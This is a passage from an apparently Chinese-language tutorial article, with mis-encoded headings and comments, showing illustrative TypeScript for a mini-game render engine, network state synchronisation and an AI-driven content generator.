    <span class="hljs-keyword">const</span> weaknesses = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">identifyWeaknesses</span>(playerHistory)
    <span class="hljs-keyword">const</span> goals = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setLearningGoals</span>(weaknesses)
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">stages</span>: goals.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">goal</span> =&gt;</span> ({
        goal,
        <span class="hljs-attr">exercises</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateExercisesForGoal</span>(goal),
        <span class="hljs-attr">metrics</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">defineSuccessMetrics</span>(goal),
        <span class="hljs-attr">aiAssistance</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">determineAIAssistanceLevel</span>(goal)
      })),
      <span class="hljs-attr">timeline</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">estimateTimeline</span>(weaknesses),
      <span class="hljs-attr">adaptive</span>: <span class="hljs-literal">true</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-4">ç¬¬äºŒç« ï¼šå°æ¸¸æˆæ¶æ„è®¾è®¡ä¸æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-5">2.1 é«˜æ€§èƒ½æ¸²æŸ“å¼•æ“</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// render/RenderEngine.ts - ç°ä»£å°æ¸¸æˆæ¸²æŸ“å¼•æ“</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">RenderConfig</span> {
  <span class="hljs-attr">maxParticles</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">maxSprites</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">useWebGL</span>: <span class="hljs-built_in">boolean</span>
  textureAtlas?: <span class="hljs-title class_">TextureAtlas</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RenderEngine</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">RenderConfig</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">renderer</span>: <span class="hljs-title class_">Renderer</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">sceneGraph</span>: <span class="hljs-title class_">SceneGraph</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">textureManager</span>: <span class="hljs-title class_">TextureManager</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">particleSystem</span>: <span class="hljs-title class_">ParticleSystem</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">renderQueue</span>: <span class="hljs-title class_">RenderQueue</span>
  
  <span class="hljs-comment">// æ€§èƒ½ç›‘æ§</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">performanceMonitor</span>: <span class="hljs-title class_">PerformanceMonitor</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">frameAnalyzer</span>: <span class="hljs-title class_">FrameAnalyzer</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: RenderConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config
    
    <span class="hljs-comment">// é€‰æ‹©æ¸²æŸ“åç«¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderer</span> = config.<span class="hljs-property">useWebGL</span> 
      ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebGLRenderer</span>()
      : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Canvas2DRenderer</span>()
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sceneGraph</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SceneGraph</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">textureManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextureManager</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">renderer</span>)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">particleSystem</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParticleSystem</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">maxParticles</span>)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderQueue</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RenderQueue</span>()
    
    <span class="hljs-comment">// åˆå§‹åŒ–æ€§èƒ½ç›‘æ§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">performanceMonitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceMonitor</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">frameAnalyzer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FrameAnalyzer</span>()
    
    <span class="hljs-comment">// é¢„åŠ è½½èµ„æº</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">preloadResources</span>()
  }
  
  <span class="hljs-comment">// åœºæ™¯å›¾èŠ‚ç‚¹</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">SceneNode</span> {
    <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>
    <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>
    <span class="hljs-attr">scaleX</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>
    <span class="hljs-attr">scaleY</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>
    <span class="hljs-attr">rotation</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>
    <span class="hljs-attr">alpha</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>
    <span class="hljs-attr">visible</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>
    <span class="hljs-attr">children</span>: <span class="hljs-title class_">SceneNode</span>[] = []
    
    <span class="hljs-comment">// æ¸²æŸ“ç»„ä»¶</span>
    renderComponent?: <span class="hljs-title class_">RenderComponent</span>
    
    <span class="hljs-title function_">addChild</span>(<span class="hljs-params">node: SceneNode</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span>.<span class="hljs-title function_">push</span>(node)
    }
    
    <span class="hljs-title function_">update</span>(<span class="hljs-params">deltaTime: <span class="hljs-built_in">number</span></span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> child.<span class="hljs-title function_">update</span>(deltaTime))
    }
    
    <span class="hljs-title function_">render</span>(<span class="hljs-params">ctx: <span class="hljs-built_in">any</span></span>) {
      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">visible</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">alpha</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>
      
      ctx.<span class="hljs-title function_">save</span>()
      
      <span class="hljs-comment">// åº”ç”¨å˜æ¢</span>
      ctx.<span class="hljs-title function_">translate</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>)
      ctx.<span class="hljs-title function_">rotate</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">rotation</span>)
      ctx.<span class="hljs-title function_">scale</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">scaleX</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">scaleY</span>)
      ctx.<span class="hljs-property">globalAlpha</span> *= <span class="hljs-variable language_">this</span>.<span class="hljs-property">alpha</span>
      
      <span class="hljs-comment">// æ¸²æŸ“è‡ªèº«</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">renderComponent</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderComponent</span>.<span class="hljs-title function_">render</span>(ctx)
      }
      
      <span class="hljs-comment">// æ¸²æŸ“å­èŠ‚ç‚¹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> child.<span class="hljs-title function_">render</span>(ctx))
      
      ctx.<span class="hljs-title function_">restore</span>()
    }
  }
  
  <span class="hljs-comment">// ç²¾çµæ‰¹å¤„ç†æ¸²æŸ“</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpriteBatch</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">sprites</span>: <span class="hljs-title class_">Sprite</span>[] = []
    <span class="hljs-keyword">private</span> <span class="hljs-attr">texture</span>: <span class="hljs-title class_">Texture</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">batchSize</span>: <span class="hljs-built_in">number</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">vertexBuffer</span>: <span class="hljs-built_in">any</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">indexBuffer</span>: <span class="hljs-built_in">any</span>
    
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">texture: Texture, maxSprites: <span class="hljs-built_in">number</span> = <span class="hljs-number">1000</span></span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">texture</span> = texture
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">batchSize</span> = maxSprites
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initializeBuffers</span>()
    }
    
    <span class="hljs-title function_">addSprite</span>(<span class="hljs-params">sprite: Sprite</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">sprites</span>.<span class="hljs-title function_">push</span>(sprite)
      
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">sprites</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">batchSize</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flush</span>()
      }
    }
    
    <span class="hljs-title function_">flush</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">sprites</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>
      
      <span class="hljs-comment">// æ‰¹é‡ä¸Šä¼ é¡¶ç‚¹æ•°æ®</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">uploadVertexData</span>()
      
      <span class="hljs-comment">// æ‰§è¡Œç»˜åˆ¶</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderBatch</span>()
      
      <span class="hljs-comment">// æ¸…ç©ºæ‰¹å¤„ç†</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">sprites</span> = []
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">renderBatch</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// WebGLæ‰¹å¤„ç†æ¸²æŸ“é€»è¾‘</span>
      <span class="hljs-keyword">const</span> gl = <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderer</span>.<span class="hljs-property">gl</span>
      
      gl.<span class="hljs-title function_">bindTexture</span>(gl.<span class="hljs-property">TEXTURE_2D</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">texture</span>.<span class="hljs-property">handle</span>)
      gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ARRAY_BUFFER</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">vertexBuffer</span>)
      gl.<span class="hljs-title function_">bindBuffer</span>(gl.<span class="hljs-property">ELEMENT_ARRAY_BUFFER</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">indexBuffer</span>)
      
      <span class="hljs-comment">// è®¾ç½®é¡¶ç‚¹å±æ€§</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupVertexAttributes</span>()
      
      <span class="hljs-comment">// ç»˜åˆ¶</span>
      gl.<span class="hljs-title function_">drawElements</span>(
        gl.<span class="hljs-property">TRIANGLES</span>,
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">sprites</span>.<span class="hljs-property">length</span> * <span class="hljs-number">6</span>,
        gl.<span class="hljs-property">UNSIGNED_SHORT</span>,
        <span class="hljs-number">0</span>
      )
    }
  }
  
  <span class="hljs-comment">// åŠ¨æ€åˆ†è¾¨ç‡è°ƒæ•´</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicResolution</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">targetFPS</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">60</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">currentScale</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1.0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">minScale</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0.5</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">maxScale</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1.0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">adjustmentStep</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0.1</span>
    
    <span class="hljs-title function_">adjustBasedOnPerformance</span>(<span class="hljs-attr">frameTimes</span>: <span class="hljs-built_in">number</span>[]): <span class="hljs-built_in">number</span> {
      <span class="hljs-keyword">const</span> avgFrameTime = frameTimes.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b) / frameTimes.<span class="hljs-property">length</span>
      <span class="hljs-keyword">const</span> currentFPS = <span class="hljs-number">1000</span> / avgFrameTime
      
      <span class="hljs-keyword">if</span> (currentFPS &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">targetFPS</span> - <span class="hljs-number">5</span>) {
        <span class="hljs-comment">// æ€§èƒ½ä¸è¶³ï¼Œé™ä½åˆ†è¾¨ç‡</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentScale</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">minScale</span>,
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentScale</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">adjustmentStep</span>
        )
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentFPS &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">targetFPS</span> + <span class="hljs-number">5</span>) {
        <span class="hljs-comment">// æ€§èƒ½å……è¶³ï¼Œæé«˜åˆ†è¾¨ç‡</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentScale</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxScale</span>,
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentScale</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">adjustmentStep</span>
        )
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentScale</span>
    }
  }
}
</code></pre>
<h4 data-id="heading-6">2.2 ç½‘ç»œä¸æ•°æ®åŒæ­¥ç³»ç»Ÿ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// network/GameNetwork.ts - å°æ¸¸æˆç½‘ç»œé€šä¿¡ç³»ç»Ÿ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">NetworkConfig</span> {
  <span class="hljs-attr">serverUrl</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">reconnectAttempts</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">heartbeatInterval</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">useWebSocket</span>: <span class="hljs-built_in">boolean</span>
  compression?: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">GameNetwork</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">NetworkConfig</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">connection</span>: <span class="hljs-title class_">Connection</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">messageQueue</span>: <span class="hljs-title class_">MessageQueue</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">syncManager</span>: <span class="hljs-title class_">SyncManager</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">authManager</span>: <span class="hljs-title class_">AuthManager</span>
  
  <span class="hljs-comment">// ç½‘ç»œçŠ¶æ€ç›‘æ§</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">networkMonitor</span>: <span class="hljs-title class_">NetworkMonitor</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">lagCompensation</span>: <span class="hljs-title class_">LagCompensation</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: NetworkConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config
    
    <span class="hljs-comment">// åˆå§‹åŒ–è¿æ¥</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">connection</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">useWebSocket</span>
      ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketConnection</span>(config.<span class="hljs-property">serverUrl</span>)
      : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HTTPConnection</span>(config.<span class="hljs-property">serverUrl</span>)
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">messageQueue</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageQueue</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">syncManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncManager</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">authManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthManager</span>()
    
    <span class="hljs-comment">// ç½‘ç»œä¼˜åŒ–æ¨¡å—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">networkMonitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkMonitor</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lagCompensation</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LagCompensation</span>()
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupEventListeners</span>()
  }
  
  <span class="hljs-comment">// å®æ—¶æ•°æ®åŒæ­¥</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">SyncManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">gameState</span>: <span class="hljs-built_in">any</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">syncRate</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">30</span> <span class="hljs-comment">// 30Hz</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">lastSyncTime</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">pendingUpdates</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()
    
    <span class="hljs-comment">// çŠ¶æ€æ’å€¼</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">interpolationBuffer</span>: <span class="hljs-title class_">InterpolationBuffer</span>
    
    <span class="hljs-comment">// é¢„æµ‹ä¸è°ƒå’Œ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">predictionEngine</span>: <span class="hljs-title class_">PredictionEngine</span>
    
    <span class="hljs-title function_">syncGameState</span>(<span class="hljs-params">state: GameState</span>) {
      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
      
      <span class="hljs-comment">// æ§åˆ¶åŒæ­¥é¢‘ç‡</span>
      <span class="hljs-keyword">if</span> (now - <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastSyncTime</span> &lt; <span class="hljs-number">1000</span> / <span class="hljs-variable language_">this</span>.<span class="hljs-property">syncRate</span>) {
        <span class="hljs-keyword">return</span>
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastSyncTime</span> = now
      
      <span class="hljs-comment">// å·®å¼‚æ£€æµ‹å’Œå‹ç¼©</span>
      <span class="hljs-keyword">const</span> delta = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateDelta</span>(state, <span class="hljs-variable language_">this</span>.<span class="hljs-property">gameState</span>)
      
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(delta).<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendSyncMessage</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">'state_update'</span>,
          <span class="hljs-attr">timestamp</span>: now,
          delta,
          <span class="hljs-attr">checksum</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateChecksum</span>(state)
        })
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">gameState</span> = state
      }
    }
    
    <span class="hljs-comment">// å¤„ç†æœåŠ¡å™¨æƒå¨æ›´æ–°</span>
    <span class="hljs-title function_">handleServerUpdate</span>(<span class="hljs-params">update: ServerUpdate</span>) {
      <span class="hljs-comment">// éªŒè¯æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateUpdate</span>(update)) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">requestResync</span>()
        <span class="hljs-keyword">return</span>
      }
      
      <span class="hljs-comment">// åº”ç”¨æœåŠ¡å™¨çŠ¶æ€</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">applyServerState</span>(update.<span class="hljs-property">state</span>)
      
      <span class="hljs-comment">// è°ƒå’Œæœ¬åœ°é¢„æµ‹</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">predictionEngine</span>.<span class="hljs-title function_">reconcile</span>(update)
      
      <span class="hljs-comment">// æ’å€¼åˆ°å¹³æ»‘æ˜¾ç¤º</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">interpolationBuffer</span>.<span class="hljs-title function_">addState</span>(update)
    }
  }
  
  <span class="hljs-comment">// æ¶ˆæ¯å‹ç¼©ä¸ä¼˜åŒ–</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageOptimizer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">compression</span>: <span class="hljs-title class_">Compression</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">deltaEncoding</span>: <span class="hljs-title class_">DeltaEncoding</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">messagePooling</span>: <span class="hljs-title class_">MessagePooling</span>
    
    <span class="hljs-title function_">optimizeMessage</span>(<span class="hljs-attr">message</span>: <span class="hljs-title class_">GameMessage</span>): <span class="hljs-title class_">OptimizedMessage</span> {
      <span class="hljs-comment">// 1. ç§»é™¤å†—ä½™æ•°æ®</span>
      <span class="hljs-keyword">const</span> cleaned = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">removeRedundantData</span>(message)
      
      <span class="hljs-comment">// 2. åº”ç”¨å¢é‡ç¼–ç </span>
      <span class="hljs-keyword">const</span> deltaEncoded = <span class="hljs-variable language_">this</span>.<span class="hljs-property">deltaEncoding</span>.<span class="hljs-title function_">encode</span>(cleaned)
      
      <span class="hljs-comment">// 3. å‹ç¼©æ•°æ®</span>
      <span class="hljs-keyword">const</span> compressed = <span class="hljs-variable language_">this</span>.<span class="hljs-property">compression</span>.<span class="hljs-title function_">compress</span>(deltaEncoded)
      
      <span class="hljs-comment">// 4. æ·»åŠ å…ƒæ•°æ®</span>
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">payload</span>: compressed,
        <span class="hljs-attr">metadata</span>: {
          <span class="hljs-attr">originalSize</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(message).<span class="hljs-property">length</span>,
          <span class="hljs-attr">compressedSize</span>: compressed.<span class="hljs-property">length</span>,
          <span class="hljs-attr">compressionRatio</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateRatio</span>(message, compressed)
        }
      }
    }
  }
  
  <span class="hljs-comment">// AIè¾…åŠ©ç½‘ç»œä¼˜åŒ–</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">AINetworkOptimizer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-attr">aiModel</span>: <span class="hljs-built_in">any</span>
    <span class="hljs-keyword">private</span> <span class="hljs-attr">patternRecognition</span>: <span class="hljs-title class_">PatternRecognition</span>
    
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">predictNetworkConditions</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">NetworkPrediction</span>&gt; {
      <span class="hljs-keyword">const</span> historicalData = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">collectNetworkData</span>()
      <span class="hljs-keyword">const</span> patterns = <span class="hljs-variable language_">this</span>.<span class="hljs-property">patternRecognition</span>.<span class="hljs-title function_">analyze</span>(historicalData)
      
      <span class="hljs-keyword">const</span> prediction = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiModel</span>.<span class="hljs-title function_">predict</span>({
        <span class="hljs-attr">currentConditions</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCurrentConditions</span>(),
        <span class="hljs-attr">historicalPatterns</span>: patterns,
        <span class="hljs-attr">timeOfDay</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getHours</span>(),
        <span class="hljs-attr">userLocation</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getUserLocation</span>()
      })
      
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">expectedLatency</span>: prediction.<span class="hljs-property">latency</span>,
        <span class="hljs-attr">expectedPacketLoss</span>: prediction.<span class="hljs-property">packetLoss</span>,
        <span class="hljs-attr">suggestedActions</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateOptimizationSuggestions</span>(prediction)
      }
    }
    
    <span class="hljs-title function_">adaptiveSyncStrategy</span>(<span class="hljs-attr">playerCount</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">gameMode</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">SyncStrategy</span> {
      <span class="hljs-comment">// AIåŠ¨æ€è°ƒæ•´åŒæ­¥ç­–ç•¥</span>
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiModel</span>.<span class="hljs-title function_">determineStrategy</span>({
        playerCount,
        gameMode,
        <span class="hljs-attr">networkConditions</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCurrentConditions</span>(),
        <span class="hljs-attr">deviceCapabilities</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getDeviceInfo</span>()
      })
    }
  }
}
</code></pre>
<h3 data-id="heading-7">ç¬¬ä¸‰ç« ï¼šAIç”Ÿæˆæ¸¸æˆå†…å®¹ä¸ä¸ªæ€§åŒ–</h3>
<h4 data-id="heading-8">3.1 åŠ¨æ€å†…å®¹ç”Ÿæˆç³»ç»Ÿ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// content/AIContentGenerator.ts - AIé©±åŠ¨çš„å†…å®¹ç”Ÿæˆ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ContentGenerationRequest</span> {
  <span class="hljs-attr">gameType</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">difficulty</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">playerPreferences</span>: <span class="hljs-title class_">PlayerPreferences</span>
  constraints?: <span class="hljs-title class_">ContentConstraints</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AIContentGenerator</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">aiClient</span>: <span class="hljs-title class_">AIClient</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">contentValidator</span>: <span class="hljs-title class_">ContentValidator</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">styleTransfer</span>: <span class="hljs-title class_">StyleTransfer</span>
  
  <span class="hljs-comment">// å†…å®¹ç¼“å­˜</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">contentCache</span>: <span class="hljs-title class_">LRUCache</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">GameContent</span>&gt;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">templateLibrary</span>: <span class="hljs-title class_">TemplateLibrary</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">apiKey: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiClient</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIClient</span>(apiKey)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">contentValidator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentValidator</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">styleTransfer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StyleTransfer</span>()
    
